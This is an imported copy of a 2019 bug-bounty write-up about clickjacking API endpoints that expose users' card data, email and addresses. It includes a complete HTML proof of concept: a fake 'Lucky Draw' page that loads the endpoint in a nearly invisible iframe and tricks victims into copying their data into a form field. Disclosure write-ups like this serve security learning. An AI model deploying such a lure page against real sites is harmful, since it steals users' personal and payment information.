---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-06-21_1800-worth-clickjacking.md
original_filename: 2019-06-21_1800-worth-clickjacking.md
title: $1800 worth Clickjacking
category: documents
detected_topics:
- command-injection
- clickjacking
- api-security
tags:
- imported
- documents
- command-injection
- clickjacking
- api-security
language: en
raw_sha256: bc50b45d1b02e19a56e9501e7102cacfec52776e01a1e52dfeb321f6f0c20fa5
text_sha256: cf733c60c9d80167b5b38e7a1fcf1b47b0e32ec82ad0e09d5869cfcd99371e95
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# $1800 worth Clickjacking

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-06-21_1800-worth-clickjacking.md
- Source Type: markdown
- Detected Topics: command-injection, clickjacking, api-security
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `bc50b45d1b02e19a56e9501e7102cacfec52776e01a1e52dfeb321f6f0c20fa5`
- Text SHA256: `cf733c60c9d80167b5b38e7a1fcf1b47b0e32ec82ad0e09d5869cfcd99371e95`


## Content

---
title: "$1800 worth Clickjacking"
url: "https://medium.com/@osamaavvan/1800-worth-clickjacking-1f92e79d0414"
authors: ["Osama Avvan (@osamaavvan)"]
bugs: ["Clickjacking"]
bounty: "1,800"
publication_date: "2019-06-21"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5193
scraped_via: "browseros"
---

# $1800 worth Clickjacking

Top highlight

$1800 worth Clickjacking
Osama Avvan
Follow
2 min read
·
Jun 21, 2019

184

3

In this writeup, I will talk about how I earned a total of $1800 by exploiting Clickjacking on pages where User sensitive information was disclosed, It was a private program on Bugcorwd.

So there were some API endpoints, which were disclosing User Information like Credit Card Data, Email, Name, Phone, Address, User Id, etc.

https://example.com/api/v1/wallet/payments?language=en

https://example.com/api/v1/profile/personal

https://example.com/api/v1/wallet/address/shipping

https://www.example.com/no-cache/profileSystem/getProfile

Now as there was no X-FRAME Header on any of these endpoints so I was able to load them in an IFRAME.

Get Osama Avvan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now I had to create an HTML page to trick the user into stealing their Information. So I created an HTML page.

Press enter or click to view image in full size
HTML CODE

<!DOCTYPE html>
<html>
<head>
<title></title>
</head>
<body>

<div id=”parent”>

<center><h1 style=”color: blue; text-decoration: underline;”>Lucky Draw to Win $100</h1></center>

<h3>Click inside the box and Press CTRL+A then CTRL+C</h3>

<div style=”border: 2px solid gray;”>
<iframe src=”https://example.com/api/v1/wallet/payments?language=en" width=”100%” style=”opacity: 0.01"></iframe>

</div>

<h3>Click inside the box and press CTRL+V</h3>
<input type=”password” name=”” size=”1">
<! — <textarea rows=”1" cols=”1" style=”resize: none;”></textarea> →
<br>
<button id=”btn”>Click to Win</button>

</div>

</body>

<script>
document.querySelector(“#btn”).onclick = function() {
console.log(document.querySelector(“input”).value)
alert(“Congratulation! You have won $100”)
}
</script>

</html>

Now after performing all the steps when the user will click on the Button, his/her information will be logged in the console.

Press enter or click to view image in full size

So that was it, Thank you for Reading.
